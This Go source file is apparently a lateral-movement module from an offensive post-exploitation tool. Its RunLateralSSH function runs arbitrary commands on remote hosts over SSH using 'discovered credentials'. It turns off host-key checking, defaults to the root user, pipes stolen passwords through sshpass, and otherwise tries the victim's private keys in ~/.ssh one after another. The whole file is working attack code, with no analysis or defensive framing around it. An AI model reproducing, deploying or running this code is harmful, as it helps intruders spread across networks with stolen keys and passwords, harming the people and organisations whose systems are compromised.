package module

import (
	"fmt"
	"strings"
)

// RunLateralSSH performs an SSH jump to a remote host using discovered credentials.
// Params: target (host:port), user, keyPath (optional), command
func RunLateralSSH(params map[string]interface{}) (string, error) {
	target, _ := params["target"].(string)
	user, _ := params["user"].(string)
	command, _ := params["command"].(string)
	keyPath, _ := params["keyPath"].(string)
	password, _ := params["password"].(string)

	if target == "" || command == "" {
		return "", fmt.Errorf("target and command params required")
	}
	if user == "" {
		user = "root"
	}

	var cmds []string
	if keyPath != "" {
		cmds = append(cmds, fmt.Sprintf("ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i %s %s@%s '%s' 2>&1", escapeSQ(keyPath), escapeSQ(user), escapeSQ(target), escapeSQ(command)))
	} else if password != "" {
		// Use sshpass if available
		cmds = append(cmds, fmt.Sprintf("sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 %s@%s '%s' 2>&1 || echo 'sshpass failed, try --keyPath instead'", escapeSQ(password), escapeSQ(user), escapeSQ(target), escapeSQ(command)))
	} else {
		// Try default key discovery
		cmds = append(cmds, fmt.Sprintf("for key in ~/.ssh/id_rsa ~/.ssh/id_ed25519 ~/.ssh/id_ecdsa; do [ -f \"$key\" ] && ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i \"$key\" %s@%s '%s' 2>/dev/null && break; done", escapeSQ(user), escapeSQ(target), escapeSQ(command)))
	}

	return run(strings.Join(cmds, "\n"))
}

// RunLateralAll runs lateral movement probes using available credentials.
func RunLateralAll(params map[string]interface{}) (string, error) {
	return RunLateralSSH(params)
}
